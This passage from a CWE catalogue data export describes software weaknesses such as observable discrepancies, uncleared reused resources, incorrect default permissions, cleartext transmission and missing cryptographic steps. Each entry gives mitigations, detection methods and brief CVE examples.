{
  "doc-96690afa2dd65c52915f86bb1443947f": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n203,\"Observable Discrepancy\",Base,Incomplete,\"The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not.\",\"Discrepancies can take many forms, and variations may be detectable in timing, control flow, communications such as replies or requests, or general behavior. These discrepancies can reveal information about the product's operation or internal state to an unauthorized actor. In some cases, discrepancies can be used by attackers to form a side channel.\",::NATURE:ChildOf:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:200:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:Side Channel Attack:DESCRIPTION:Observable Discrepancies are at the root of side channel attacks.::\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Access Control:IMPACT:Read Application Data:IMPACT:Bypass Protection Mechanism:NOTE:An attacker can gain access to sensitive information about the system, including authentication information that may allow an attacker to gain access to the system.::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:When cryptographic primitives are vulnerable to side-channel-attacks, this could be used to reveal unencrypted plaintext in the worst case.::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.::\",\"::REFERENCE:CVE-2020-8695:DESCRIPTION:Observable discrepancy in the RAPL interface for some Intel processors allows information disclosure.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8695::REFERENCE:CVE-2019-14353:DESCRIPTION:Crypto hardware wallet's power consumption relates to total number of pixels illuminated, creating a side channel in the USB connection that allows attackers to determine secrets displayed such as PIN numbers and passwords:LINK:https://www.cve.org/CVERecord?id=CVE-2019-14353::REFERENCE:CVE-2019-10071:DESCRIPTION:Java-oriented framework compares HMAC signatures using String.equals() instead of a constant-time algorithm, causing timing discrepancies:LINK:https://www.cve.org/CVERecord?id=CVE-2019-10071::REFERENCE:CVE-2002-2094:DESCRIPTION:This, and others, use .. attacks and monitor error responses, so there is overlap with directory traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2094::REFERENCE:CVE-2001-1483:DESCRIPTION:Enumeration of valid usernames based on inconsistent responses:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1483::REFERENCE:CVE-2001-1528:DESCRIPTION:Account number enumeration via inconsistent responses.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1528::REFERENCE:CVE-2004-2150:DESCRIPTION:User enumeration via discrepancies in error messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2150::REFERENCE:CVE-2005-1650:DESCRIPTION:User enumeration via discrepancies in error messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1650::REFERENCE:CVE-2004-0294:DESCRIPTION:Bulletin Board displays different error messages when a user exists or not, which makes it easier for remote attackers to identify valid users and conduct a brute force password guessing attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0294::REFERENCE:CVE-2004-0243:DESCRIPTION:Operating System, when direct remote login is disabled, displays a different message if the password is correct, which allows remote attackers to guess the password via brute force methods.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0243::REFERENCE:CVE-2002-0514:DESCRIPTION:Product allows remote attackers to determine if a port is being filtered because the response packet TTL is different than the default TTL.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0514::REFERENCE:CVE-2002-0515:DESCRIPTION:Product sets a different TTL when a port is being filtered than when it is not being filtered, which allows remote attackers to identify filtered ports by comparing TTLs.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0515::REFERENCE:CVE-2002-0208:DESCRIPTION:Product modifies TCP/IP stack and ICMP error messages in unusual ways that show the product is in use.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0208::REFERENCE:CVE-2004-2252:DESCRIPTION:Behavioral infoleak by responding to SYN-FIN packets.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2252::REFERENCE:CVE-2001-1387:DESCRIPTION:Product may generate different responses than specified by the administrator, possibly leading to an information leak.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1387::REFERENCE:CVE-2004-0778:DESCRIPTION:Version control system allows remote attackers to determine the existence of arbitrary files and directories via the -X command for an alternate history file, which causes different error messages to be returned.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0778::REFERENCE:CVE-2004-1428:DESCRIPTION:FTP server generates an error message if the user name does not exist instead of prompting for a password, which allows remote attackers to determine valid usernames.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1428::REFERENCE:CVE-2003-0078:DESCRIPTION:SSL implementation does not perform a MAC computation if an incorrect block cipher padding is used, which causes an information leak (timing discrepancy) that may make it easier to launch cryptographic attacks that rely on distinguishing between padding and MAC verification errors, possibly leading to extraction of the original plaintext, aka the Vaudenay timing attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0078::REFERENCE:CVE-2000-1117:DESCRIPTION:Virtual machine allows malicious web site operators to determine the existence of files on the client by measuring delays in the execution of the getSystemResource method.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1117::REFERENCE:CVE-2003-0637:DESCRIPTION:Product uses a shorter timeout for a non-existent user than a valid user, which makes it easier for remote attackers to guess usernames and conduct brute force password guessing.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0637::REFERENCE:CVE-2003-0190:DESCRIPTION:Product immediately sends an error message when a user does not exist, which allows remote attackers to determine valid usernames via a timing attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0190::REFERENCE:CVE-2004-1602:DESCRIPTION:FTP server responds in a different amount of time when a given username exists, which allows remote attackers to identify valid usernames by timing the server response.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1602::REFERENCE:CVE-2005-0918:DESCRIPTION:Browser allows remote attackers to determine the existence of arbitrary files by setting the src property to the target filename and using Javascript to determine if the web page immediately stops loading, which indicates whether the file exists or not.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0918::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Discrepancy Information Leaks::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A6:ENTRY NAME:Information Leakage and Improper Error Handling:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A7:ENTRY NAME:Improper Error Handling:MAPPING FIT:CWE More Specific::\",::189::,\"\",\n226,\"Sensitive Information in Resource Not Removed Before Reuse\",Base,Draft,\"The product releases a resource such as memory or a file so that it can be made available for reuse, but it does not clear or zeroize the information contained in the resource before the product performs a critical state transition or makes the resource available for reuse by other entities.\",\"When resources are released, they can be made available for reuse. For example, after memory is de-allocated, an operating system may make the memory available to another process, or disk space may be reallocated when a file is deleted. As removing information requires time and additional resources, operating systems do not usually clear the previously written information. Even when the resource is reused by the same process, this weakness can arise when new data is not as large as the old data, which leaves portions of the old data still available. Equivalent errors can occur in other situations where the length of data is variable but the associated data structure is not. If memory is not cleared after use, the information may be read by less trustworthy parties when the memory is reallocated. This weakness can apply in hardware, such as when a device or system switches between power, sleep, or debug states during normal operation, or when execution changes to different users or privilege levels.\",::NATURE:ChildOf:CWE ID:459:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:212:VIEW ID:1000::NATURE:CanPrecede:CWE ID:201:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::\",\"::METHOD:Manual Analysis:DESCRIPTION:Write a known pattern into each sensitive location. Trigger the release of the resource or cause the desired state transition to occur. Read data back from the sensitive locations. If the reads are successful, and the data is the same as the pattern that was originally written, the test fails and the product needs to be fixed. Note that this test can likely be automated.:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:During critical state transitions, information not needed in the next state should be removed or overwritten with fixed patterns (such as all 0's) or random data, before the transition to the next state.:EFFECTIVENESS:High::PHASE:Architecture and Design Implementation:DESCRIPTION:When releasing, de-allocating, or deleting a resource, overwrite its data and relevant metadata with fixed patterns or random data. Be cautious about complex resource types whose underlying representation might be non-contiguous or change at a low level, such as how a file might be split into different chunks on a file system, even though logical file positions are contiguous at the application layer. Such resource types might require invocation of special modes or APIs to tell the underlying operating system to perform the necessary clearing, such as SDelete (Secure Delete) on Windows, although the appropriate functionality might not be available at the application layer.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2019-3733:DESCRIPTION:Cryptography library does not clear heap memory before release:LINK:https://www.cve.org/CVERecord?id=CVE-2019-3733::REFERENCE:CVE-2003-0001:DESCRIPTION:Ethernet NIC drivers do not pad frames with null bytes, leading to infoleak from malformed packets.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0001::REFERENCE:CVE-2003-0291:DESCRIPTION:router does not clear information from DHCP packets that have been previously used:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0291::REFERENCE:CVE-2005-1406:DESCRIPTION:Products do not fully clear memory buffers when less data is stored into the buffer than previous.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1406::REFERENCE:CVE-2005-1858:DESCRIPTION:Products do not fully clear memory buffers when less data is stored into the buffer than previous.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1858::REFERENCE:CVE-2005-3180:DESCRIPTION:Products do not fully clear memory buffers when less data is stored into the buffer than previous.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3180::REFERENCE:CVE-2005-3276:DESCRIPTION:Product does not clear a data structure before writing to part of it, yielding information leak of previously used memory.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3276::REFERENCE:CVE-2002-2077:DESCRIPTION:Memory not properly cleared before reuse.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2077::\",::Memory Management::Networking::,::Memory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Sensitive Information Uncleared Before Use::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MEM03-C:ENTRY NAME:Clear sensitive information stored in reusable resources returned for reuse::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",::37::,\"::TYPE:Relationship:NOTE:There is a close association between CWE-226 and CWE-212. The difference is partially that of perspective. CWE-226 is geared towards the final stage of the resource lifecycle, in which the resource is deleted, eliminated, expired, or otherwise released for reuse. Technically, this involves a transfer to a different control sphere, in which the original contents of the resource are no longer relevant. CWE-212, however, is intended for sensitive data in resources that are intentionally shared with others, so they are still active. This distinction is useful from the perspective of the CWE research view (CWE-1000).::TYPE:Maintenance:NOTE:This entry needs modification to clarify the differences with CWE-212. The description also combines two problems that are distinct from the CWE research perspective: the inadvertent transfer of information to another sphere, and improper initialization/shutdown. Some of the associated taxonomy mappings reflect these different uses.::TYPE:Research Gap:NOTE:This is frequently found for network packets, but it can also exist in local memory allocation, files, etc.::\",\n276,\"Incorrect Default Permissions\",Base,Draft,\"During installation, installed file permissions are set to allow anyone to modify those files.\",\"\",::NATURE:ChildOf:CWE ID:732:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:732:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::PHASE:Installation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Inter-application Flow Analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Host Application Interface Scanner Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer Automated Monitored Execution Forced Path Execution:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Configuration Checker:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:The architecture needs to access and modification attributes for files to only those users who actually require those actions.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::\",\"::REFERENCE:CVE-2005-1941:DESCRIPTION:Executables installed world-writable.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1941::REFERENCE:CVE-2002-1713:DESCRIPTION:Home directories installed world-readable.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1713::REFERENCE:CVE-2001-1550:DESCRIPTION:World-writable log files allow information loss; world-readable file has cleartext passwords.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1550::REFERENCE:CVE-2002-1711:DESCRIPTION:World-readable directory.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1711::REFERENCE:CVE-2002-1844:DESCRIPTION:Windows product uses insecure permissions when installing on Solaris (genesis: port error).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1844::REFERENCE:CVE-2001-0497:DESCRIPTION:Insecure permissions for a shared secret key file. Overlaps cryptographic problem.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0497::REFERENCE:CVE-1999-0426:DESCRIPTION:Default permissions of a device allow IP spoofing.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0426::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insecure Default Permissions::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO06-C:ENTRY NAME:Create files with appropriate access permissions::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:FIO01-J:ENTRY NAME:Create files with appropriate access permission::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.03.08::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 2.1::\",::1::127::81::,\"\",\n319,\"Cleartext Transmission of Sensitive Information\",Base,Draft,\"The product transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.\",\"Many communication channels can be sniffed (monitored) by adversaries during data transmission. For example, in networking, packets can traverse many intermediary nodes from the source to the destination, whether across the internet, an internal network, the cloud, etc. Some actors might have privileged access to a network interface or any link along the channel, such as a router, but they might not be authorized to collect the underlying data. As a result, network traffic could be sniffed by adversaries, spilling security-critical data. Applicable communication channels are not limited to software products. Applicable channels include hardware-specific technologies such as internal hardware networks and external debug channels, supporting remote JTAG debugging. When mitigations are not applied to combat adversaries within the product's threat model, this weakness significantly lowers the difficulty of exploitation by such adversaries. When full communications are recorded or logged, such as with a packet dump, an adversary could attempt to obtain the dump long after the transmission has occurred and try to sniff the cleartext from the recorded communications in the dump itself. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.\",::NATURE:ChildOf:CWE ID:311:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:311:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Cloud Computing:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Often::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Test/Debug Hardware:TECHNOLOGY PREVALENCE:Often::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Architecture and Design:NOTE:For hardware, this may be introduced when design does not plan for an attacker having physical access while a legitimate user is remotely operating the device.::PHASE:Operation::PHASE:System Configuration::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Read Application Data:IMPACT:Modify Files or Directories:NOTE:Anyone can read the information by gaining access to the channel being used for communication.::\",\"::METHOD:Black Box:DESCRIPTION:Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic. Attach the monitor to the process, trigger the feature that sends the data, and look for the presence or absence of common cryptographic functions in the call tree. Monitor the network and determine if the data packets contain readable commands. Tools exist for detecting if certain encodings are in use. If the traffic contains high entropy, this might indicate the usage of encryption.::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Before transmitting, encrypt the data using reliable, confidentiality-protecting cryptographic protocols.::PHASE:Implementation:DESCRIPTION:When using web applications with SSL, use SSL for the entire session from login to logout, not just for the initial login page.::PHASE:Implementation:DESCRIPTION:When designing hardware platforms, ensure that approved encryption algorithms (such as those recommended by NIST) protect paths from security critical data to trusted user applications.::PHASE:Testing:DESCRIPTION:Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.::PHASE:Operation:DESCRIPTION:Configure servers to use encrypted channels for communication, which may include SSL or other secure protocols.::\",\"::REFERENCE:CVE-2022-29519:DESCRIPTION:Programmable Logic Controller (PLC) sends sensitive information in plaintext, including passwords and session tokens.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29519::REFERENCE:CVE-2022-30312:DESCRIPTION:Building Controller uses a protocol that transmits authentication credentials in plaintext.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30312::REFERENCE:CVE-2022-31204:DESCRIPTION:Programmable Logic Controller (PLC) sends password in plaintext.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-31204::REFERENCE:CVE-2002-1949:DESCRIPTION:Passwords transmitted in cleartext.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1949::REFERENCE:CVE-2008-4122:DESCRIPTION:Chain: Use of HTTPS cookie without secure flag causes it to be transmitted across unencrypted HTTP.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4122::REFERENCE:CVE-2008-3289:DESCRIPTION:Product sends password hash in cleartext in violation of intended policy.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3289::REFERENCE:CVE-2008-4390:DESCRIPTION:Remote management feature sends sensitive information including passwords in cleartext.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4390::REFERENCE:CVE-2007-5626:DESCRIPTION:Backup routine sends password in cleartext in email.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5626::REFERENCE:CVE-2004-1852:DESCRIPTION:Product transmits Blowfish encryption key in cleartext.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1852::REFERENCE:CVE-2008-0374:DESCRIPTION:Printer sends configuration information, including administrative password, in cleartext.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0374::REFERENCE:CVE-2007-4961:DESCRIPTION:Chain: cleartext transmission of the MD5 hash of password enables attacks against a server that is susceptible to replay (CWE-294).:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4961::REFERENCE:CVE-2007-4786:DESCRIPTION:Product sends passwords in cleartext to a log server.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4786::REFERENCE:CVE-2005-3140:DESCRIPTION:Product sends file with cleartext passwords in e-mail message intended for diagnostic purposes.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3140::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Plaintext Transmission of Sensitive Information::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC06-J:ENTRY NAME:Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SER02-J:ENTRY NAME:Sign then seal sensitive objects before sending them outside a trust boundary::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 4.1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 4.1B::\",::102::117::383::477::65::,\"::TYPE:Maintenance:NOTE:The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the Mapping CWE to 62443 subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.::\",\n325,\"Missing Cryptographic Step\",Base,Draft,\"The product does not implement a required step in a cryptographic algorithm, resulting in weaker encryption than advertised by the algorithm.\",\"\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:358:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Developers sometimes omit expensive (resource-intensive) steps in order to improve performance, especially in devices with limited memory or slower CPUs. This step may be taken under a mistaken impression that the step is unnecessary for the cryptographic algorithm.::PHASE:Requirements:NOTE:This issue may happen when the requirements for the cryptographic algorithm are not clearly stated.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::SCOPE:Accountability:SCOPE:Non-Repudiation:IMPACT:Hide Activities::\",\"\",\"\",\"::REFERENCE:CVE-2001-1585:DESCRIPTION:Missing challenge-response step allows authentication bypass using public key.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1585::\",::Cryptography::,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Missing Required Cryptographic Step::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A8:ENTRY NAME:Insecure Cryptographic Storage:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A9:ENTRY NAME:Insecure Communications:MAPPING FIT:CWE More Specific::\",::68::,\"::TYPE:Relationship:NOTE:Overlaps incomplete/missing security check.::TYPE:Relationship:NOTE:Can be resultant.::\",\n440,\"Expected Behavior Violation\",Base,Draft,\"A feature, API, or function does not perform according to its specification.\",\"\",::NATURE:ChildOf:CWE ID:684:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Varies by Context::\",\"\",\"\",\"::REFERENCE:CVE-2003-0187:DESCRIPTION:Program uses large timeouts on unconfirmed connections resulting from inconsistency in linked lists implementations.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0187::REFERENCE:CVE-2003-0465:DESCRIPTION:strncpy in Linux kernel acts different than libc on x86, leading to expected behavior difference - sort of a multiple interpretation error?:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0465::REFERENCE:CVE-2005-3265:DESCRIPTION:Buffer overflow in product stems the use of a third party library function that is expected to have internal protection against overflows, but doesn't.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3265::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Expected behavior violation::\",,\"::TYPE:Theoretical:NOTE:The behavior of an application that is not consistent with the expectations of the developer may lead to incorrect use of the software.::\",\n441,\"Unintended Proxy or Intermediary ('Confused Deputy')\",Class,Draft,\"The product receives a request, message, or directive from an upstream component, but the product does not sufficiently preserve the original source of the request before forwarding the request to an external actor that is outside of the product's control sphere. This causes the product to appear to be the source of the request, leading it to act as a proxy or other intermediary between the upstream component and the external actor.\",\"If an attacker cannot directly contact a target, but the product has access to the target, then the attacker can send a request to the product and have it be forwarded to the target. The request would appear to be coming from the product's system, not the attacker's system. As a result, the attacker can bypass access controls (such as firewalls) or hide the source of malicious requests, since the requests would not be coming directly from the attacker. Since proxy functionality and message-forwarding often serve a legitimate purpose, this issue only becomes a vulnerability when: The product runs with different privileges or on a different system, or otherwise has different levels of access than the upstream component; The attacker is prevented from making the request directly to the target; and The attacker can create a request that the proxy does not explicitly intend to be forwarded on the behalf of the requester. Such a request might point to an unexpected hostname, port number, hardware IP, or service. Or, the request might be sent to an allowed service, but the request could contain disallowed directives, commands, or resources.\",::NATURE:ChildOf:CWE ID:610:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:668:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:Confused Deputy:DESCRIPTION:This weakness is sometimes referred to as the Confused deputy problem, in which an attacker misused the authority of one victim (the confused deputy) when targeting another victim.::\",\"::PHASE:Architecture and Design:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Non-Repudiation:SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Hide Activities:IMPACT:Execute Unauthorized Code or Commands::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of 